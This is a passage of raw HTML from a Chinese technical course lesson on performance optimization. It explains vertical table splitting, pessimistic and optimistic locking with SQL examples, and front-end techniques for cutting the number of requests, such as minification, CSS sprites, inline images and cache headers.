data-first-offset="true"><span data-slate-string="true">我们前面介绍过的 Sharding 和 Partitioning 就是属于这一类型。那么，在查询或修改的时候，我们怎么知道数据在哪台机器上呢？</span></span></span> 
</div> <div class="se-10950224 " data-slate-type="paragraph" data-slate-object="block" data-key="1080"> 
<span data-slate-object="text" data-key="1081"><span data-slate-leaf="true" data-offset-key="1081:0" 
data-first-offset="true"><span data-slate-string="true">这就可以根据主键做 hash 映射或者范围映射来找到相应的节点，再继续进行操作了。Hash 
映射本专栏已经介绍过了，而范围映射也很常见，比如用户的交易数据，3 月份的数据一个表，4 月份的数据一个表，这就是使用时间来做范围条件的一个例子。</span></span></span> 
</div> <div class="se-09794791 " data-slate-type="paragraph" data-slate-object="block" data-key="1082"> 
<span data-slate-object="text" data-key="1083"><span data-slate-leaf="true" data-offset-key="1083:0" 
data-first-offset="true"><span class="se-c62cd2b9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">再来说说垂直拆分，说的是把一个表拆成多个表，甚至拆到多个库中，这时的拆分是按照不同列来进行的，拆分出的表结构是完全不一样的，表和表之间通常使用外键关联。</span></span></span></span><span 
data-slate-object="text" data-key="1084"><span data-slate-leaf="true" data-offset-key="1084:0" 
data-first-offset="true"><span data-slate-string="true">比如有这样一个文件表：</span></span></span> </div> 
<div class="se-2398056c" data-slate-type="image" data-slate-object="block" data-key="1085"> 
<img class="se-4be23076" src="https://static001.geekbang.org/resource/image/c9/2d/c91431880c44619198a143488ef15a2d.jpg"> 
</div> <div class="se-13c01575 " data-slate-type="paragraph" data-slate-object="block" data-key="1086"> 
<span data-slate-object="text" data-key="1087"><span data-slate-leaf="true" data-offset-key="1087:0" 
data-first-offset="true"><span data-slate-string="true">各列分别为：唯一 ID、标题、创建日期、描述，以及以 BLOB 格式存储的文件具体内容（CONTENT）。</span></span></span> 
</div> <div class="se-689a2d7d " data-slate-type="paragraph" data-slate-object="block" data-key="1088"> 
<span data-slate-object="text" data-key="1089"><span data-slate-leaf="true" data-offset-key="1089:0" 
data-first-offset="true"><span data-slate-string="true">在这种情况下，如果执行全表扫描的查询，在文件非常大且记录数非常多的情况下，执行的过程会非常慢。这是因为一般的关系数据库是行数据库，数据是一行一行读取的（关于行数据库和列数据库的区别和原理，你可以回看 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1090" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1091"><span data-slate-leaf="true" data-offset-key="1091:0" 
data-first-offset="true"><span data-slate-string="true">[第 25 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1092"><span data-slate-leaf="true" data-offset-key="1092:0" 
data-first-offset="true"><span data-slate-string="true">），磁盘一次读取一块，这一块内包含若干行。那么由于 CONTENT 列往往非常大，每次读取只能读到非常少的行，因此需要读取很多次才能完成全表扫描。这种情况下，我们就可以做这样的拆表优化，把这个表拆成如下两个：</span></span></span> 
</div> <div class="se-9f7b9f83" data-slate-type="image" data-slate-object="block" data-key="1093"> 
<img class="se-e32ab2d7" src="https://static001.geekbang.org/resource/image/5b/8d/5b2e4b69ea8981ead2938ed27de43f8d.jpg"> 
</div> <div class="se-f55d0fd4" data-slate-type="image" data-slate-object="block" data-key="1094"> 
<img class="se-74c920ba" src="https://static001.geekbang.org/resource/image/06/9d/06d16222996df1acba163cace9b9889d.jpg"> 
</div> <div class="se-6ac3375a " data-slate-type="paragraph" data-slate-object="block" data-key="1095"> 
<span data-slate-object="text" data-key="1096"><span data-slate-leaf="true" data-offset-key="1096:0" 
data-first-offset="true"><span data-slate-string="true">你看，第一个表一下子就瘦身下来了，这个表没有了那个最大的 BLOB 对象组成的列，在全表扫描进行查询的时候，就可以比较快地进行，而当找到了相应的 
ID 并需要取出 CONTENT 的时候，再根据 ID 到第二个表里面去查询出具体需要的文件来。</span></span></span> </div> <div class="se-919599de 
" data-slate-type="paragraph" data-slate-object="block" data-key="1097"> <span data-slate-object="text" 
data-key="1098"><span data-slate-leaf="true" data-offset-key="1098:0" data-first-offset="true"><span 
data-slate-string="true">你可能注意到了，这种优化的动机和前提有这样两个：</span></span></span> </div> <div class="se-7dd67ba5" 
data-slate-type="list" data-slate-object="block" data-key="1099"> <div class="se-ac863ee7 se-dfe94fbf" 
data-slate-type="list-line" data-slate-object="block" data-key="1100"> <span data-slate-object="text" 
data-key="1101"><span data-slate-leaf="true" data-offset-key="1101:0" data-first-offset="true"><span 
class="se-6f964d38" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">查询无法单纯地走索引完成，而需要进行全表扫描或部分表扫描；</span></span></span></span> 
</div> <div class="se-da745e8c se-d151dad6" data-slate-type="list-line" data-slate-object="block" 
data-key="1102"> <span data-slate-object="text" data-key="1103"><span data-slate-leaf="true" 
data-offset-key="1103:0" data-first-offset="true"><span class="se-5fcbc8d8" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">某列或某几列占用空间巨大，而它们却并不需要参与关系查询。</span></span></span></span> 
</div> </div> <div class="se-b040f814 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1104"> <span data-slate-object="text" data-key="1105"><span data-slate-leaf="true" 
data-offset-key="1105:0" data-first-offset="true"><span data-slate-string="true">当这两个条件都符合的时候，我们就可以考虑垂直拆分（纵向拆表）了。</span></span></span> 
</div> <h3 class="se-e6437723" data-slate-type="heading" data-slate-object="block" data-key="1106"><span 
data-slate-object="text" data-key="1107"><span data-slate-leaf="true" data-offset-key="1107:0" 
data-first-offset="true"><span data-slate-string="true">4. 悲观锁变乐观锁</span></span></span></h3> 
<div class="se-d040895a " data-slate-type="paragraph" data-slate-object="block" data-key="1108"> 
<span data-slate-object="text" data-key="1109"><span data-slate-leaf="true" data-offset-key="1109:0" 
data-first-offset="true"><span data-slate-string="true">在关系数据库中，如果我们提到了“锁”，就意味着我们想让数据库某条数据的写操作变得“安全”，换言之，当我们需要根据某些条件而对数据进行更改的时候，不会受到并发的其它写操作的影响，而丧失正确性或完整性。在使用“锁”来实现的时候，有悲观锁和乐观锁两种实现。</span></span></span> 
</div> <div class="se-f27e4a48 " data-slate-type="paragraph" data-slate-object="block" data-key="1110"> 
<span data-slate-object="text" data-key="1111"><span data-slate-leaf="true" data-offset-key="1111:0" 
data-first-offset="true"><span data-slate-string="true">所谓悲观锁（Pessimistic Locking），指的是数据库从“最坏”的角度考虑，所以它会先使用排它锁锁定相应的行，进行相应的读判断和写操作，一旦成功了，再提交变更并释放锁资源。</span></span></span><span 
data-slate-object="text" data-key="1112"><span data-slate-leaf="true" data-offset-key="1112:0" 
data-first-offset="true"><span class="se-cc3f7073" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">在使用悲观锁锁定相应行的过程中，如果有其它的写操作，是无法同时进行的，而只能等待。</span></span></span></span><span 
data-slate-object="text" data-key="1113"><span data-slate-leaf="true" data-offset-key="1113:0" 
data-first-offset="true"><span data-slate-string="true">且看这样一组基于 SQL 的例子，它用于将用户的积分更新：</span></span></span> 
</div> <div class="se-deebbcd6 se-b7489931" data-slate-type="pre" data-slate-object="block" 
data-key="1114" data-code-language="sql"> <div class="se-116c8e97 se-e52d59bb"> <span></span> 
</div> <div class="se-6ec5c4c2"> <div class="se-36dff955 se-de48f225" data-code-line-number="1"></div> 
<div class="se-36dff955 se-de48f225" data-code-line-number="2"></div> <div class="se-36dff955 
se-de48f225" data-code-line-number="3"></div> </div> <div class="se-b8509798 ps ps--active-x"> 
<div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1115"> <span data-slate-object="text" data-key="1116"><span data-slate-leaf="true" 
data-offset-key="1116:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1090451220" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:1"><span data-slate-string="true"> POINTS </span></span><span 
data-slate-leaf="true" data-offset-key="1116:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2744396522" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8837943979" data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7463191865" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0986038215" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:9"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1116:10"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7992126619" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3063853232" data-annotation-type="annotation"><span data-slate-string="true">for</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1116:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3417795664" data-annotation-type="annotation"><span data-slate-string="true">update</span></span></span><span 
data-slate-leaf="true" data-offset-key="1116:15"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1117"> <span data-slate-object="text" data-key="1118"><span data-slate-leaf="true" 
data-offset-key="1118:0" data-first-offset="true"><span data-slate-string="true">... (省略，计算得出积分需要变更为 
123)</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1119"> <span data-slate-object="text" data-key="1120"><span 
data-slate-leaf="true" data-offset-key="1120:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7602693840" data-annotation-type="annotation"><span 
data-slate-string="true">update</span></span></span><span data-slate-leaf="true" data-offset-key="1120:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1120:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7701944229" 
data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1120:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7943975505" data-annotation-type="annotation"><span data-slate-string="true">set</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:5"><span data-slate-string="true"> POINTS=</span></span><span 
data-slate-leaf="true" data-offset-key="1120:6"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6649006453" data-annotation-type="annotation"><span data-slate-string="true">123</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1120:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8113472397" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1120:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4985712302" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:11"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1120:12"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2368717687" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1120:13"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 341px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-0c9968de " data-slate-type="paragraph" data-slate-object="block" 
data-key="1121"> <span data-slate-object="text" data-key="1122"><span data-slate-leaf="true" 
data-offset-key="1122:0" data-first-offset="true"><span data-slate-string="true">我来简单做个说明：</span></span></span> 
</div> <div class="se-3b0b426a" data-slate-type="list" data-slate-object="block" data-key="1123"> 
<div class="se-c902f62c se-1a190d8a" data-slate-type="list-line" data-slate-object="block" 
data-key="1124"> <span data-slate-object="text" data-key="1125"><span data-slate-leaf="true" 
data-offset-key="1125:0" data-first-offset="true"><span data-slate-string="true">第一行，使用 “for 
update” 这个技巧来锁定 ID 为 1001 的记录，查询出当前的积分；</span></span></span> </div> <div class="se-d234d8b7 
se-99ee6293" data-slate-type="list-line" data-slate-object="block" data-key="1126"> <span data-slate-object="text" 
data-key="1127"><span data-slate-leaf="true" data-offset-key="1127:0" data-first-offset="true"><span 
data-slate-string="true">第二行，业务逻辑得到积分需要如何变更，假如说得出的结果是积分需要变更为 123；</span></span></span> </div> 
<div class="se-001f1a80 se-ba80edcc" data-slate-type="list-line" data-slate-object="block" 
data-key="1128"> <span data-slate-object="text" data-key="1129"><span data-slate-leaf="true" 
data-offset-key="1129:0" data-first-offset="true"><span data-slate-string="true">第三行，执行积分变更（这里假设事务在 
update 之后是配置为自动提交的）；</span></span></span> </div> </div> <div class="se-9e4c2ee6 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1130"> <span data-slate-object="text" data-key="1131"><span 
data-slate-leaf="true" data-offset-key="1131:0" data-first-offset="true"><span data-slate-string="true">这样一来，如果有两条请求同时想执行以上逻辑，那么第一条请求可以执行成功，而第二条会一直等在那里，直到第一条执行完成，它再去执行。这种方式就保证了锁机制的有效性。</span></span></span> 
</div> <div class="se-04b230d3 " data-slate-type="paragraph" data-slate-object="block" data-key="1132"> 
<span data-slate-object="text" data-key="1133"><span data-slate-leaf="true" data-offset-key="1133:0" 
data-first-offset="true"><span data-slate-string="true">下面再来说说乐观锁（Optimistic Locking）。它和悲观锁正好相反，这种情况假定“大多数”的操作发生锁冲突的概率较小，使用一个当前版本号，来表示当前记录的版本。</span></span></span><span 
data-slate-object="text" data-key="1134"><span data-slate-leaf="true" data-offset-key="1134:0" 
data-first-offset="true"><span class="se-4a535c44" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">乐观锁方式下，不需要使用显示的加锁、提交这样的操作，但缺点是一旦发生冲突，整个过程要重来。</span></span></span></span><span 
data-slate-object="text" data-key="1135"><span data-slate-leaf="true" data-offset-key="1135:0" 
data-first-offset="true"><span data-slate-string="true">我们可以把前面的步骤变成下面这样：</span></span></span> 
</div> <div class="se-42dfc74e se-d0741971" data-slate-type="pre" data-slate-object="block" 
data-key="1136" data-code-language="sql"> <div class="se-ce96332d se-07af021a"> <span></span> 
</div> <div class="se-57023fc9"> <div class="se-67b51e57 se-118d254d" data-code-line-number="1"></div> 
<div class="se-67b51e57 se-118d254d" data-code-line-number="2"></div> <div class="se-67b51e57 
se-118d254d" data-code-line-number="3"></div> </div> <div class="se-17710f30 ps ps--active-x"> 
<div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1137"> <span data-slate-object="text" data-key="1138"><span data-slate-leaf="true" 
data-offset-key="1138:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3860325070" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:1"><span data-slate-string="true"> POINTS, </span></span><span 
data-slate-leaf="true" data-offset-key="1138:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8186464124" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3197327694" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8563781119" data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4290485284" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1138:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6544410952" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:11"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1138:12"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4999598592" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1138:13"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1139"> <span data-slate-object="text" data-key="1140"><span data-slate-leaf="true" 
data-offset-key="1140:0" data-first-offset="true"><span data-slate-string="true">... (省略，计算得出积分需要变更为 
123)</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1141"> <span data-slate-object="text" data-key="1142"><span 
data-slate-leaf="true" data-offset-key="1142:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9209360976" data-annotation-type="annotation"><span 
data-slate-string="true">update</span></span></span><span data-slate-leaf="true" data-offset-key="1142:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1142:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0112109973" 
data-annotation-type="annotation"><span data-slate-string="true">USERS</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2415081140" data-annotation-type="annotation"><span data-slate-string="true">set</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:5"><span data-slate-string="true"> POINTS=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:6"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8787399330" data-annotation-type="annotation"><span data-slate-string="true">123</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5171732128" data-annotation-type="annotation"><span data-slate-string="true">and</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9742230892" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:11"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8173673891" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:13"><span data-slate-string="true">+</span></span><span 
data-slate-leaf="true" data-offset-key="1142:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6131484861" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0487444689" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7382752392" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:19"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1438655303" data-annotation-type="annotation"><span data-slate-string="true">1001</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:21"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:22"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4457229452" data-annotation-type="annotation"><span data-slate-string="true">and</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:23"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1142:24"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9525514001" data-annotation-type="annotation"><span data-slate-string="true">VERSION</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:25"><span data-slate-string="true">=</span></span><span 
data-slate-leaf="true" data-offset-key="1142:26"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1675551321" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="1142:27"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 219px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-853b7469" data-slate-type="list" data-slate-object="block" 
data-key="1143"> <div class="se-5641c63b se-9fc7f328" data-slate-type="list-line" data-slate-object="block" 
data-key="1144"> <span data-slate-object="text" data-key="1145"><span data-slate-leaf="true" 
data-offset-key="1145:0" data-first-offset="true"><span data-slate-string="true">第一行，在读取积分的时候，也一并读取到了当前的版本号，假设版本号是 
1；</span></span></span> </div> <div class="se-f1625929 se-cb1f2474" data-slate-type="list-line" 
data-slate-object="block" data-key="1146"> <span data-slate-object="text" data-key="1147"><span 
data-slate-leaf="true" data-offset-key="1147:0" data-first-offset="true"><span data-slate-string="true">第二行，业务逻辑得到积分需要如何变更，假如说得出的结果是积分需要变更为 
123；</span></span></span> </div> <div class="se-adc9b24f se-0ebfbfcf" data-slate-type="list-line" 
data-slate-object="block" data-key="1148"> <span data-slate-object="text" data-key="1149"><span 
data-slate-leaf="true" data-offset-key="1149:0" data-first-offset="true"><span data-slate-string="true">第三行，更新积分为 
123 并自增版本号，但是条件是版本号为 1。之后需要检测这条 update 语句影响的代码行数：如果影响的行数为 1，说明更新成功，程序结束；如果影响的行数为 0，说明在第一行读取数据以后，记录发生了变更，需要重新执行整个过程。</span></span></span> 
</div> </div> <div class="se-ce765887 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1150"> <span data-slate-object="text" data-key="1151"><span data-slate-leaf="true" 
data-offset-key="1151:0" data-first-offset="true"><span data-slate-string="true">还有许许多多其它的后端和持久层的优化通用技术，这里就不展开了。比如缓存的应用，互联网应用有句话叫做“缓存为王”，缓存的本质就是空间换时间，在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1152" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1153"><span data-slate-leaf="true" data-offset-key="1153:0" 
data-first-offset="true"><span data-slate-string="true">[第 21 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1154"><span data-slate-leaf="true" data-offset-key="1154:0" 
data-first-offset="true"><span data-slate-string="true"> 中我们曾经仔细聊过这部分的内容。再比如，应用之外，我们还经常需要从应用宿主和操作系统等角度来考虑，对于这部分，我在扩展阅读中我给出了一些材料供你阅读。</span></span></span> 
</div> <h2 class="se-3dc28475" data-slate-type="heading" data-slate-object="block" data-key="1155"><span 
data-slate-object="text" data-key="1156"><span data-slate-leaf="true" data-offset-key="1156:0" 
data-first-offset="true"><span data-slate-string="true">前端和网络层优化</span></span></span></h2> 
<div class="se-c6f86feb " data-slate-type="paragraph" data-slate-object="block" data-key="1157"> 
<span data-slate-object="text" data-key="1158"><span data-slate-leaf="true" data-offset-key="1158:0" 
data-first-offset="true"><span data-slate-string="true">当我们思考前端优化的时候，和后端一样，我们可以考虑连接、下载、解析、加载、渲染等等整个过程，先从大局上对整个时间消耗的分布有一个把握，下图来自</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1159" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1160"><span data-slate-leaf="true" data-offset-key="1160:0" 
data-first-offset="true"><span data-slate-string="true">这篇</span></span></span></a><span data-slate-object="text" 
data-key="1161"><span data-slate-leaf="true" data-offset-key="1161:0" data-first-offset="true"><span 
data-slate-string="true">文章。</span></span></span> </div> <div class="se-41aea8be" data-slate-type="image" 
data-slate-object="block" data-key="1162"> <img class="se-77844b36" src="https://static001.geekbang.org/resource/image/73/91/7321dc1c3cc44bc7a15b1efaf2e92391.jpeg"> 
</div> <h3 class="se-29a9e72c" data-slate-type="heading" data-slate-object="block" data-key="1163"><span 
data-slate-object="text" data-key="1164"><span data-slate-leaf="true" data-offset-key="1164:0" 
data-first-offset="true"><span data-slate-string="true">1. 减少请求次数</span></span></span></h3> 
<div class="se-5136cc8a " data-slate-type="paragraph" data-slate-object="block" data-key="1165"> 
<span data-slate-object="text" data-key="1166"><span data-slate-leaf="true" data-offset-key="1166:0" 
data-first-offset="true"><span data-slate-string="true">这是进行许多前端优化的共同目标之一，有不少全栈工程师日常在进行的实践，都遵循了这一条原则。</span></span></span> 
</div> <div class="se-96733e5c" data-slate-type="list" data-slate-object="block" data-key="1167"> 
<div class="se-f90bb044 se-be2cfb51" data-slate-type="list-line" data-slate-object="block" 
data-key="1168"> <span data-slate-object="text" data-key="1169"><span data-slate-leaf="true" 
data-offset-key="1169:0" data-first-offset="true"><span data-slate-string="true">文本资源：CSS 压缩、JavaScript 
压缩。有两个静态资源的后期处理方式我们经常结合起来使用，一个是压缩，一个是混淆。前者将多个文件压缩成一个，目的是减少大小，而更重要的是减少请求数；后者则是将变量使用无意义的名称替代，目的就是让产品代码“难懂”，减少代码实际意义的泄露。</span></span></span> 
</div> <div class="se-0b2eb1ca se-85f80ca0" data-slate-type="list-line" data-slate-object="block" 
data-key="1170"> <span data-slate-object="text" data-key="1171"><span data-slate-leaf="true" 
data-offset-key="1171:0" data-first-offset="true"><span data-slate-string="true">图像资源：</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1172" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1173"><span data-slate-leaf="true" data-offset-key="1173:0" 
data-first-offset="true"><span data-slate-string="true">CSS Sprites</span></span></span></a><span 
data-slate-object="text" data-key="1174"><span data-slate-leaf="true" data-offset-key="1174:0" 
data-first-offset="true"><span data-slate-string="true"> 和 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1175" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="1176"><span data-slate-leaf="true" data-offset-key="1176:0" data-first-offset="true"><span 
data-slate-string="true">Inline Image</span></span></span></a><span data-slate-object="text" 
data-key="1177"><span data-slate-leaf="true" data-offset-key="1177:0" data-first-offset="true"><span 
data-slate-string="true">。前者又叫做雪碧图、精灵图，是将网站所用的多张图片拼成一张，这样多张图片只需要下载一次，而使用 CSS 中的 background-image 
和 background-position 在目标位置选择显示哪一张图片。后者则是干脆将二进制的图片使用 Base64 算法序列化成文本，直接嵌入在原始页面上。</span></span></span> 
</div> <div class="se-ea000f70 se-2a05ff04" data-slate-type="list-line" data-slate-object="block" 
data-key="1178"> <span data-slate-object="text" data-key="1179"><span data-slate-leaf="true" 
data-offset-key="1179:0" data-first-offset="true"><span data-slate-string="true">缓存控制头部。即 Cache-Control 
头，这部分我们在 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1180" 
class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1181"><span data-slate-leaf="true" 
data-offset-key="1181:0" data-first-offset="true"><span data-slate-string="true">[第 21 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1182"><span data-slate-leaf="true" data-offset-key="1182:0" 
data-first-offset="true"><span data-slate-string="true"> 已经介绍过；还有 Etag 头，浏览器会把它发送给服务端用于鉴别目标资源是否发生了更改，如果没有更改，一个 
304 响应会返回；以及 Expires 头，是服务端来指定过期时间的。</span></span></span> </div> </div> <h3 class="se-12252576" 
data-slate-type="heading" data-slate-object="block" data-key="1183"><span data-slate-object="text" 
